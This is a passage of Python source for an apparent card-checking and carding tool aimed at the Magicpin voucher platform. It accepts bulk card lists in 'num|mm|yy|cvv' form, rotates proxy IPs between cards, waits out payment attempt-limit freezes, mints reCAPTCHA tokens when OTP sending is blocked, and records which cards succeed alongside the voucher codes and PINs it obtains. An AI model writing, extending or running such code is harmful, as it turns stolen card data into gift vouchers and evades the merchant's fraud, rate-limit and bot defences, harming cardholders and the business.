        for pat in (r"/gateway/([A-Za-z0-9_-]{16,})", r"paynext3ds/([A-Za-z0-9_-]{16,})", r"[?&]order_token=([A-Za-z0-9_-]+)", r"pt=(session_[A-Za-z0-9_-]+)"):
            m = re.search(pat, url)
            if m:
                return m.group(1)
        return None

    def _voucher_rows(self, items):
        out = []
        for it in items or []:
            t = str(it.get("type") or "").lower()
            if t.startswith("dynamic") or t in ("ad", "ads", "floating_banner", "carousel", "banner"):
                continue
            if it.get("is_ad") is True or str(it.get("is_ad")).lower() == "true":
                continue
            amap = (it.get("analytics") or {}).get("analytics_map") or {}
            if "is_ad" in it or amap.get("is_ad") is True:
                continue
            out.append(it)
        return out

    def capture_txn_baseline(self):
        base = {}
        for it in self._voucher_rows(self.purchased()):
            tid = it.get("transaction_id") or it.get("transactionId") or it.get("id")
            if tid:
                base[str(tid)] = it.get("CreatedAt")
        self._txn_baseline = base
        return base

    def _new_rows(self, rows):
        if not self._txn_baseline:
            return rows
        out = []
        for it in rows or []:
            tid = it.get("transaction_id") or it.get("transactionId") or it.get("id")
            key = str(tid or "")
            if not key or key not in self._txn_baseline:
                out.append(it)
        return out

    def _decline_reason(self, cb):
        try:
            url = cb.headers.get("Location") or ""
            txt = ""
            for _ in range(4):
                if not url:
                    break
                r2 = self.pg.get(url, timeout=12)
                if r2.status_code == 302:
                    url = r2.headers.get("Location") or ""
                    if url and (url.startswith("magicpin.in") or "payment/result" in url):
                        break
                    continue
                txt = r2.text
                break
            cands = [
                re.search(r'id=[\'"]error-text[\'"]>([^<]+)<', txt),
                re.search(r'class=[\'"][^\'"]*error[^\'"]*[\'"]>[^<]*>([^<]{8,120})<', txt),
                re.search(r'(?:declined|not (?:authorised|authorized)|insufficient|fraud|risk|invalid card|expired|failed)[^<.]{0,60}', txt, re.I),
            ]
            for m in cands:
                if m:
                    s = m.group(1) if m.lastindex else m.group(0)
                    s = s.strip()
                    if s and len(s) >= 4:
                        return s[:160]
        except Exception:
            pass
        return ""

    def resolve_3ds(self, txn_id, challenge_url=None, retries=8, delay=0.8):
        order_token = self.order_token_from(challenge_url or "")
        if challenge_url:
            try:
                self.http.get(challenge_url, timeout=8)
            except Exception:
                pass
        last = {"status": "PENDING", "message": "waiting settlement"}
        failure = None
        for attempt in range(max(1, retries)):
            if order_token:
                try:
                    cb = self._px_req("GET", f"https://pg.magicpin.com/cards/payment/cashfreeCallback?order_id={txn_id}&order_token={order_token}", follow_redirects=False, retries=2)
                    loc = cb.headers.get("Location") or ""
                    if "payment_status=success" in loc:
                        return {"status": "SUCCESS", "message": "settled", "order_token": order_token}
                    if "payment_status=failure" in loc:
                        reason = self._decline_reason(cb)
                        if not reason and "payment_status=" in loc:
                            reason = unquote(loc.split("payment_status=")[-1].split("&")[0])
                        msg = f"payment failed: {reason}" if reason and reason.lower() != "failure" else "payment failed (gateway declined card)"
                        last = {"status": "FAILURE", "message": msg, "order_token": order_token}
                        if reason:
                            last["reason"] = reason
                        failure = last
                        if attempt >= 1:
                            return last
                except Exception as e:
                    last = {"status": "PENDING", "message": f"callback error: {e}"}
            try:
                st = self._pg_req("GET", f"https://pg.magicpin.com/pg/payment/refreshPaymentStatus/{txn_id}", headers={"accept": "application/json, text/plain, */*", "referer": f"https://pg.magicpin.com/page/{txn_id}/startpayment"}, retries=2).json()
                pst = str(st.get("paymentStatus") or "").upper()
                op = st.get("orderPlaced")
                if pst in ("SUCCESS", "PAID", "COMPLETED") or op is True:
                    return {"status": "SUCCESS", "message": "paymentStatus=success", "raw": st}
                if pst in ("FAILURE", "FAILED", "DECLINED") or op is False:
                    msg = st.get("message") or (f"payment failed ({pst or 'declined'})")
                    return {"status": "FAILURE", "message": msg, "reason": msg, "raw": st}
            except Exception:
                pass
            try:
                got = self.purchased()
                valid = self._new_rows(self._voucher_rows(got))
                if valid:
                    entries = []
                    for it in valid:
                        entry = self._entry_from_row(it, txn_id)
                        self._enrich_from_redeem(it, entry, txn_id, order_token)
                        entries.append(entry)
                    return {"status": "SUCCESS", "message": "voucher delivered", "vouchers": entries}
            except Exception:
                pass
            if failure and attempt >= 2:
                return failure
            time.sleep(delay)
        if failure:
            return failure
        if order_token:
            return {"status": "FAILURE", "message": "3ds not completed", "order_token": order_token}
        return {"status": "PENDING", "message": "settlement pending", "order_token": order_token}

    def check_result(self, txn_id, order_token=None):
        if order_token:
            try:
                cb = self.px.get(f"https://pg.magicpin.com/cards/payment/cashfreeCallback?order_id={txn_id}&order_token={order_token}", follow_redirects=False, timeout=8)
                loc = cb.headers.get("Location") or ""
                if "payment_status=success" in loc:
                    return {"status": "SUCCESS", "message": "confirmed success"}
                if "payment_status=failure" in loc:
                    return {"status": "FAILURE", "message": "confirmed failure"}
            except Exception:
                pass
        try:
            opts = self.pg_options(txn_id)
            dl = opts.get("deeplink") or ""
            if "payment_status=success" in dl:
                return {"status": "SUCCESS", "message": "verified via pg session"}
            if "payment_status=failure" in dl and opts.get("optionsData", {}).get("lastPaymentMethodData"):
                return {"status": "FAILURE", "message": "declined on gateway"}
        except Exception:
            pass
        try:
            st = self._pg_req("GET", f"https://pg.magicpin.com/pg/payment/refreshPaymentStatus/{txn_id}", headers={"accept": "application/json, text/plain, */*", "referer": f"https://pg.magicpin.com/page/{txn_id}/startpayment"}).json()
            pst = str(st.get("paymentStatus", "")).upper()
            op = st.get("orderPlaced")
            if pst in ("SUCCESS", "PAID", "COMPLETED") or op is True:
                return {"status": "SUCCESS", "message": "pg success"}
            if pst in ("FAILURE", "FAILED", "DECLINED") or op is False:
                return {"status": "FAILURE", "message": st.get("message") or "payment failed"}
        except Exception:
            pass
        try:
            valid = self._new_rows(self._voucher_rows(self.purchased()))
            if valid:
                for it in valid:
                    entry = self._entry_from_row(it, txn_id)
                    self._enrich_from_redeem(it, entry, txn_id, order_token)
                    if entry.get("voucher_code") or entry.get("voucher_pin"):
                        return {"status": "SUCCESS", "message": "voucher delivered", "vouchers": [entry]}
                return {"status": "SUCCESS", "message": "voucher delivered", "vouchers": valid}
        except Exception:
            pass
        return {"status": "PENDING", "message": "still pending"}

    def purchased(self):
        url = "https://magicpin.in/sam-api/user/transactions/?filter=voucher"
        headers = {"accept": "application/json, text/plain, */*", "referer": "https://magicpin.in/user/transactions/"}
        for u in (url, "https://magicpin.in/sam-api/user/transactions/"):
            try:
                r = self.http.get(u, headers=headers)
                if r.status_code == 200:
                    items = r.json().get("data") or r.json().get("transactions") or []
                    if items:
                        return items
            except Exception:
                pass
        return []

    def _card_text(self, v):
        if isinstance(v, dict):
            v = v.get("value") if "value" in v else (list(v.values())[0] if len(v) == 1 else "")
        return str(v or "").strip()

    def _entry_from_row(self, it, txn_id=None, default_code="in app"):
        amap = (it.get("analytics") or {}).get("analytics_map") or {}
        title = self._card_text(it.get("title")) or self._card_text(it.get("item_title")) or self._card_text(amap.get("item_title")) or self._card_text(amap.get("subject_name")) or "voucher"
        amount = self._card_text(it.get("sub_title")) or self._card_text(it.get("amount")) or self._card_text(it.get("worthPrice")) or self._card_text(it.get("value")) or self._card_text(it.get("voucher_amount"))
        amount = re.sub(r"#arrow#.*$", "", amount).strip()
        return {
            "brand": title,
            "amount": amount,
            "voucher_code": it.get("voucher_code") or it.get("code") or it.get("voucherCode") or it.get("couponCode") or it.get("giftCode") or it.get("gift_code") or it.get("promo_code") or it.get("redemption_code") or default_code,
            "voucher_pin": it.get("voucher_pin") or it.get("pin") or it.get("voucherPin") or it.get("secret") or it.get("pinCode") or "",
            "expiry": str(it.get("valid_till") or it.get("expiry") or it.get("expiry_date") or ""),
            "order_id": str(it.get("transaction_id") or it.get("order_id") or txn_id or ""),
        }

    def collect_vouchers(self, txn_id=None, retries=6, delay=0.8, order_token=None):
        out = []
        for _ in range(max(1, retries)):
            items = self.purchased()
            valid = self._new_rows(self._voucher_rows(items))
            if valid:
                for it in valid:
                    entry = self._entry_from_row(it, txn_id)
                    self._enrich_from_redeem(it, entry, txn_id, order_token)
                    out.append(entry)
                return out
            if retries:
                time.sleep(delay)
        return out

    def _enrich_from_redeem(self, it, entry, txn_id, order_token=None):
        did = it.get("transaction_id") or it.get("transactionId") or it.get("id") or txn_id
        if did:
            try:
                info = self.voucher_detail_page(did)
                if info.get("voucher_code"):
                    entry["voucher_code"] = info["voucher_code"]
                if info.get("voucher_pin"):
                    entry["voucher_pin"] = info["voucher_pin"]
                if info.get("expiry"):
                    entry["expiry"] = info["expiry"]
                if info.get("voucher_code") or info.get("voucher_pin"):
                    return
            except Exception:
                pass
        if entry.get("voucher_code") and entry["voucher_code"] not in ("", "in app"):
            return
        mid = (it.get("analytics") or {}).get("analytics_map", {}).get("merchant_id") or it.get("merchant_id")
        rid = it.get("id") or it.get("voucher_id") or it.get("redemption_id") or it.get("redemptionId") or it.get("order_id") or txn_id
        tid = it.get("transaction_id") or it.get("transactionId") or txn_id
        token = order_token or it.get("token")
        if not mid or not rid:
            return
        for tok in (token, rid):
            if not tok:
                continue
            try:
                resp = self.redeem_voucher(rid, tid, mid, tok)
                code, pin, exp = self._voucher_creds(resp)
                if code:
                    entry["voucher_code"] = code
                if pin:
                    entry["voucher_pin"] = pin
                if exp:
                    entry["expiry"] = str(exp)
                if code or pin:
                    return
            except Exception:
                pass

    def redeem_voucher(self, voucher_id, transaction_id, merchant_id, token):
        hd = {"accept": "application/json, text/plain, */*", "referer": "https://magicpin.in/user/transactions/", "content-type": "application/json"}
        r = self.http.post("https://magicpin.in/sam-api/vouchers/redeem/", json={"data": {"transaction_id": str(transaction_id), "merchant_id": int(merchant_id), "id": str(voucher_id), "token": str(token)}}, headers=hd, timeout=15)
        if r.status_code == 200 and r.text:
            return r.json()
        return {}

    def voucher_detail_page(self, txn_id):
        m = re.search(r"window\.pageProps\s*=\s*JSON\.parse\(`(.*?)`\)", self.http.get(f"https://magicpin.in/voucherdetails?transaction_id={txn_id}", timeout=20).text, re.DOTALL)
        if not m:
            return {}
        try:
            d = json.loads(m.group(1).encode().decode("unicode_escape", errors="replace"))
        except Exception:
            return {}
        pd = d.get("payment_details") or {}
        code = (pd.get("primary_voucher_code_info") or {}).get("value") or pd.get("code") or ""
        pin = (pd.get("secondary_voucher_code_info") or {}).get("value") or pd.get("pin") or ""
        exp = pd.get("valid_till") or pd.get("validity") or pd.get("expiry") or ""
        return {"voucher_code": code or "", "voucher_pin": pin or "", "expiry": str(exp or "")}

    def _voucher_creds(self, resp):
        if not isinstance(resp, dict):
            return "", "", ""
        code = resp.get("data") or resp
        code = code.get("voucher_code") or code.get("code") or code.get("voucherCode") or code.get("couponCode") or code.get("giftCode") if isinstance(code, dict) else ""
        pin = resp.get("data") or resp
        pin = pin.get("voucher_pin") or pin.get("pin") or pin.get("secret") if isinstance(pin, dict) else ""
        exp = resp.get("data") or resp
        exp = exp.get("valid_till") or exp.get("expiry") or exp.get("expiry_date") or "" if isinstance(exp, dict) else ""
        return code or "", pin or "", exp or ""


def collect_cards():
    print("card entry mode:")
    print("  s. single  (one card: num|mm|yy|cvv)")
    print("  b. bulk    (up to 10 cards, one per line, blank line to finish)")
    ch = input("choose (s/b, default s): ").strip().lower()
    cards = []
    if ch.startswith("b"):
        print("paste cards (num|mm|yy|cvv), max 10 — empty line to finish:")
        while len(cards) < 10:
            line = input().strip()
            if not line:
                break
            try:
                parse_card(line)
            except ValueError as e:
                print(f"  [{e}] skipping")
                continue
            cards.append(line)
    else:
        line = input("card (num|mm|yy|cvv): ").strip()
        if line:
            cards.append(line)
    return cards


def parse_card(raw):
    parts = [p.strip() for p in raw.strip().split("|")]
    if len(parts) != 4:
        raise ValueError("card format must be: number|mm|yy|cvv")
    num, mon, yr, cvv = parts
    num = num.replace(" ", "").replace("-", "")
    mon = f"{int(mon):02d}"
    if len(yr) == 2:
        yr = "20" + yr
    return num, mon, yr, cvv


def pick_brand(key):
    if not key:
        return None, None
    if key in VOUCHERS_CATALOG:
        return VOUCHERS_CATALOG[key], None
    q = key.lower()
    for item in VOUCHERS_CATALOG.values():
        if q in item["name"].lower():
            return item, None
    if key.startswith("http"):
        return {"name": "Custom Voucher", "url": key, "merchant_id": None}, None
    return None, None


def choose_brand():
    print("available vouchers:")
    for k, item in VOUCHERS_CATALOG.items():
        print(f"  {k}. {item['name']} - {item['category']}")
    print(f"  {len(VOUCHERS_CATALOG) + 1}. Custom URL")
    for _ in range(3):
        ch = input(f"choose (1-{len(VOUCHERS_CATALOG) + 1} or name): ").strip().lower()
        if not ch:
            ch = "1"
        if ch in VOUCHERS_CATALOG:
            return VOUCHERS_CATALOG[ch]
        if ch == str(len(VOUCHERS_CATALOG) + 1):
            u = input("custom url: ").strip()
            return {"name": "Custom Voucher", "url": u, "merchant_id": None}
        if ch.startswith("http"):
            return {"name": "Custom Voucher", "url": ch, "merchant_id": None}
        for k, item in VOUCHERS_CATALOG.items():
            if ch in item["name"].lower():
                return item
        print(f"  invalid choice: {ch}")
    return VOUCHERS_CATALOG["1"]


def choose_variant(vouchers):
    print("variants:")
    for i, v in enumerate(vouchers, 1):
        stock = "IN STOCK" if v.get("in_stock", True) else "SOLD OUT"
        print(f"  {i}. Rs {v['amount']:.2f}  [{v.get('name', '')}]  {stock}")
    ch = input(f"choose (1-{len(vouchers)} or amount, default 1): ").strip()
    if not ch:
        return vouchers[0]
    try:
        val = float(ch)
        for v in vouchers:
            if abs(v["amount"] - val) < 0.01:
                return v
    except ValueError:
        pass
    try:
        i = int(ch) - 1
        if 0 <= i < len(vouchers):
            return vouchers[i]
    except ValueError:
        pass
    return vouchers[0]


def _flow(opts, pos, quiet):
    log = lambda msg: print(msg, flush=True) if not quiet else None
    wait_unlock = opts.get("wait_unlock", False)
    unlock_mins = int(opts.get("unlock_mins") or 360)

    brand = None
    if pos:
        brand, _ = pick_brand(pos[0])
        if not brand:
            emit({"Gateway": "Magic Pin", "Price": "0.00INR", "Response": f"unknown brand: {pos[0]}", "brand": pos[0]})
            return 1
        url = opts.get("url") or brand["url"]
        default_mid = opts.get("url") and None or brand.get("merchant_id")
        brand_name = brand["name"]
    elif opts.get("url"):
        url = opts["url"]
        default_mid = None
        brand_name = "Custom Voucher"
    else:
        if quiet:
            emit({"Gateway": "Magic Pin", "Price": "0.00INR", "Response": "NO_BRAND: pick a brand or pass one", "brand": ""})
            return 1
        brand = choose_brand()
        url = brand["url"]
        default_mid = brand.get("merchant_id")
        brand_name = brand["name"]

    engine = Magicpin(quiet=quiet, proxy=opts.get("proxy"))

    pay_ip = getattr(engine, "_egress_fingerprint", "")
    d_ip = getattr(engine, "_direct_fingerprint", "")
    if engine.px is engine.http:
        log("[!] warning: proxy disabled/fallback; payment will exit on direct IP")
    elif pay_ip:
        log(f"[>] payment egress IP: {pay_ip}" + ("" if not d_ip or d_ip != pay_ip else "  [!] SAME as direct IP"))

    phone_arg = opts.get("phone") or ""
    saved_phone = (engine.phone or "").replace("+", "").replace("91", "")[-10:]
    if opts.get("fresh") or (phone_arg and saved_phone and saved_phone != phone_arg[-10:]):
        log("[>] fresh session, clearing saved login")
        engine.reset_session()

    try:
        catalog = engine.fetch_variants(url, default_mid)
    except Exception as e:
        emit({"Gateway": "Magic Pin", "Price": "0.00INR", "Response": f"error: {e}", "brand": brand_name})
        return 1
    if not catalog["merchant_id"]:
        emit({"Gateway": "Magic Pin", "Price": "0.00INR", "Response": "no merchant id found", "brand": brand_name})
        return 1
    if not catalog["vouchers"]:
        emit({"Gateway": "Magic Pin", "Price": "0.00INR", "Response": "no live variants", "brand": catalog["merchant_name"]})
        return 1

    variant = None
    if opts.get("amt"):
        aval = float(opts["amt"])
        for v in catalog["vouchers"]:
            if abs(v["amount"] - aval) < 0.01:
                variant = v
                break
        if not variant:
            emit({"Gateway": "Magic Pin", "Price": "0.00INR", "Response": f"amount {aval:.2f} not found on {catalog['merchant_name']}", "brand": catalog["merchant_name"]})
            return 1
    elif not quiet and not opts.get("card"):
        variant = choose_variant(catalog["vouchers"])
    else:
        variant = catalog["vouchers"][0]

    qty = int(opts.get("qty") or "1")
    if not quiet and not opts.get("qty") and not opts.get("card"):
        qin = input("quantity (default 1): ").strip()
        if qin:
            try:
                qty = int(qin)
            except ValueError:
                qty = 1

    merchant_id = catalog["merchant_id"]
    roa_id = variant["roa_id"]
    amount = variant["amount"]

    if not engine.authed():
        phone = opts.get("phone") or ""
        otp = opts.get("otp") or ""
        if phone and otp:
            log(f"[>] verifying otp for {phone}")
            engine.verify_otp(phone, otp)
        else:
            if not quiet:
                if not engine.phone:
                    engine.phone = phone or input("phone (10 digit): ").strip() or ""
                log("[>] sending otp")
                r = engine.send_otp(engine.phone)
                if str(r.get("status", "")).upper() in ("FAILURE", "ERROR") or "captcha" in str(r.get("message", "")).lower():
                    log("[>] otp blocked, retrying with fresh token")
                    engine.send_otp(engine.phone, token=engine.mint_recaptcha())
                otp_in = input("otp: ").strip()
                engine.verify_otp(engine.phone, otp_in)
        if not engine.authed():
            if not quiet:
                uid = input("user_id (or blank): ").strip()
                tok = input("auth_token (or blank): ").strip()
                if uid and tok:
                    engine.user_id = uid
                    engine.auth_token = tok
                    engine.save_session()
            if not engine.authed():
                emit({"Gateway": "Magic Pin", "Price": "0.00INR", "Response": "LOGIN_FAILED"})
                return 1

    try:
        cart = engine.payment_division(merchant_id, roa_id, amount, qty)
    except Exception as e:
        emit({"Gateway": "Magic Pin", "Price": f"{amount * qty:.2f}INR", "Response": str(e), "brand": catalog["merchant_name"]})
        return 1
    payable = cart["payable_amount"]
    log(f"[>] payable: {payable:.2f}INR")

    if payable <= 0:
        engine.capture_txn_baseline()
        r = engine.claim_free(merchant_id, roa_id, amount, qty)
        c = str(r.get("status", "")).upper()
        if c in ("SUCCESS", "OK") or r.get("success") is True:
            vs = engine.collect_vouchers(txn_id=r.get("order_id") or r.get("txnId"), retries=8)
            first = vs[0] if vs else {}
            emit({"Gateway": "Magic Pin", "Price": "0.00INR", "Response": "SUCCESS", "brand": catalog["merchant_name"], "txn_id": r.get("order_id") or r.get("txnId") or "", "voucher_code": first.get("voucher_code", ""), "voucher_pin": first.get("voucher_pin", ""), "expiry": first.get("expiry", ""), "vouchers": vs or None})
            return 0
        emit({"Gateway": "Magic Pin", "Price": "0.00INR", "Response": r.get("message") or str(r), "brand": catalog["merchant_name"]})
        return 1

    cards = []
    if opts.get("card"):
        cards.append(opts["card"])
    elif not quiet:
        cards = collect_cards()
    if not cards:
        emit({"Gateway": "Magic Pin", "Price": f"{payable:.2f}INR", "Response": "NO_CARD", "brand": catalog["merchant_name"]})
        return 1

    for card_raw in cards:
        card_no, mon, yr, cvv = parse_card(card_raw)
        log(f"[>] trying card ...{card_no[-4:]} ({cards.index(card_raw) + 1}/{len(cards)})")
        if len(cards) > 1:
            ip = engine._rebuild_pg()
            log(f"[>] rotated proxy IP: {ip or 'unknown'}")
        txn_id = engine.initiate_gateway(merchant_id, roa_id, amount, qty, payable, retries=1, cooldown=0)
        if not txn_id and getattr(engine, "last_pg_code", None) == "PG_ATTEMPT_LIMIT":
            if wait_unlock:
                started = time.time()
                ttl = unlock_mins * 60
                gap = 60
                while not txn_id and time.time() - started < ttl:
                    waited = int((time.time() - started) // 60)
                    log(f"[>] account frozen {waited}m; next poll in {gap}s (ttl {unlock_mins}m)...")
                    time.sleep(gap)
                    if len(cards) > 1:
                        engine._rebuild_pg()
                    txn_id = engine.initiate_gateway(merchant_id, roa_id, amount, qty, payable, retries=1, cooldown=0)
                    gap = min(300, gap + 30)
                if not txn_id and time.time() - started >= ttl:
                    emit({"Gateway": "Magic Pin", "Price": f"{payable:.2f}INR", "Response": f"payment attempt limit; still frozen after {unlock_mins}min, try again later", "brand": catalog["merchant_name"], "code": "PG_ATTEMPT_LIMIT_TIMEOUT", "cc": card_raw})
                    return 1
        if not txn_id:
            code = getattr(engine, "last_pg_code", None) or "UNKNOWN"
            gw_msg = getattr(engine, "last_pg_message", "") or ""
            reason = {
                "PG_ATTEMPT_LIMIT": f"payment attempt limit exceeded; {gw_msg}".strip(),
                "PG_FAILURE": gw_msg or "gateway rejected payment session",
                "UNPARSED": gw_msg or "unrecognized gateway response",
            }.get(code, gw_msg or "no txnId from pg")
            emit({"Gateway": "Magic Pin", "Price": f"{payable:.2f}INR", "Response": reason, "brand": catalog["merchant_name"], "code": code, "cc": card_raw})
            if len(cards) == 1:
                return 1
            continue
        log(f"[>] txn {txn_id}")
        base = engine.capture_txn_baseline()
        log(f"[>] baseline txns: {len(base)}")

        try:
            opts_data = engine.pg_options(txn_id)
            final_amt = float(opts_data.get("optionsData", {}).get("amount", payable))
        except Exception:
            final_amt = float(payable)

        log(f"[>] verifying card ...{card_no[-4:]}")
        v = engine.verify_card(txn_id, card_no)
        log(f"[>] verify: {v.get('status')} {v.get('message', '')}")

        pay = engine.make_payment(txn_id, card_no, mon, yr, cvv, final_amt)
        status = str(pay.get("status", "")).upper()
        pst = str(pay.get("paymentStatus", "")).upper()
        payment_url = pay.get("paymentUrl") or pay.get("deeplink") or ""
        op = pay.get("orderPlaced")

        declined = status in ("FAILURE", "FAILED", "DECLINED", "ERROR") or pst in ("FAILURE", "FAILED", "DECLINED", "ERROR") or (op is False and not payment_url)
        if declined:
            reason = pay.get("message") or pay.get("errorMessage") or pay.get("errorDescription") or pay.get("statusDescription") or pay.get("reason") or "declined"
            emit({"Gateway": "Magic Pin", "Price": f"{final_amt:.2f}INR", "Response": reason, "brand": catalog["merchant_name"], "cc": card_raw, "txn_id": txn_id})
            if len(cards) == 1:
                return 1
            continue

        if payment_url and ("http://" in payment_url or "https://" in payment_url):
            log("[>] resolving gateway challenge")
            cf = engine.cashfree_eval(payment_url)
            if cf.get("status") == "DECLINED":
                reason = cf.get("reason", "declined by gateway")
                m = re.search(r'id=[\'"]error-text[\'"]>([^<]+)<', cf.get("html_text", ""))
                if m:
                    reason = m.group(1).strip()
                emit({"Gateway": "Magic Pin", "Price": f"{final_amt:.2f}INR", "Response": reason, "brand": catalog["merchant_name"], "cc": card_raw, "txn_id": txn_id})
                if len(cards) == 1:
                    return 1
                continue
            challenge = cf.get("challenge_url", payment_url)
            res = engine.resolve_3ds(txn_id, challenge)
            vs = res.get("vouchers")
            if not vs:
                vs = engine.collect_vouchers(txn_id, order_token=res.get("order_token"))
            first = vs[0] if vs else {}
            resp = res.get("status", "PENDING")
            if resp == "FAILURE":
                reason = str(res.get("reason") or "").strip()
                msg = str(res.get("message") or "").strip()
                if reason and reason.lower() != "failure":
                    resp = reason
                elif msg:
                    resp = msg
                else:
                    resp = "FAILURE"
            out = {"Gateway": "Magic Pin", "Price": f"{final_amt:.2f}INR", "Response": resp, "brand": catalog["merchant_name"], "cc": card_raw, "txn_id": txn_id, "voucher_code": first.get("voucher_code", ""), "voucher_pin": first.get("voucher_pin", ""), "expiry": first.get("expiry", ""), "vouchers": vs or None}
            if res.get("message"):
                out["message"] = res["message"]
            emit(out)
            if res.get("status") == "SUCCESS":
                return 0
            if res.get("status") == "FAILURE":
                if len(cards) == 1:
                    return 1
                continue

        if status == "SUCCESS" or pst in ("SUCCESS", "PAID", "COMPLETED") or op is True:
            vs = engine.collect_vouchers(txn_id, order_token=pay.get("orderToken"))
            first = vs[0] if vs else {}
            emit({"Gateway": "Magic Pin", "Price": f"{final_amt:.2f}INR", "Response": "SUCCESS", "brand": catalog["merchant_name"], "cc": card_raw, "txn_id": txn_id, "voucher_code": first.get("voucher_code", ""), "voucher_pin": first.get("voucher_pin", ""), "expiry": first.get("expiry", ""), "vouchers": vs or None})
            return 0

        emit({"Gateway": "Magic Pin", "Price": f"{final_amt:.2f}INR", "Response": status or "UNKNOWN", "brand": catalog["merchant_name"], "cc": card_raw, "txn_id": txn_id})
        if len(cards) == 1:
            return 1

    return 1


def main():
    argv = sys.argv[1:]
    opts = {}
    pos = []
    i = 0
    flags = {"--url": "url", "--amt": "amt", "--qty": "qty", "--card": "card", "--phone": "phone", "--otp": "otp", "--quiet": "quiet", "--wait-unlock": "wait_unlock", "--unlock-mins": "unlock_mins", "--proxy": "proxy", "--fresh": "fresh"}
    while i < len(argv):
        if argv[i] in flags:
            if argv[i] == "--quiet":
                opts["quiet"] = True
                i += 1
            elif argv[i] == "--wait-unlock":
                opts["wait_unlock"] = True
                i += 1
            elif argv[i] == "--fresh":
                opts["fresh"] = True
                i += 1
            elif i + 1 < len(argv):
                opts[flags[argv[i]]] = argv[i + 1]
                i += 2
            else:
                i += 1
        else:
            pos.append(argv[i])
            i += 1

    brand_name = ""
    if pos:
        b, _ = pick_brand(pos[0])
        brand_name = b["name"] if b else pos[0]
    try:
        return _flow(opts, pos, opts.get("quiet", False))
    except Exception as e:
        emit({"Gateway": "Magic Pin", "Price": "0.00INR", "Response": f"error: {e}", "brand": brand_name})
        return 1


if __name__ == "__main__":
    sys.exit(main())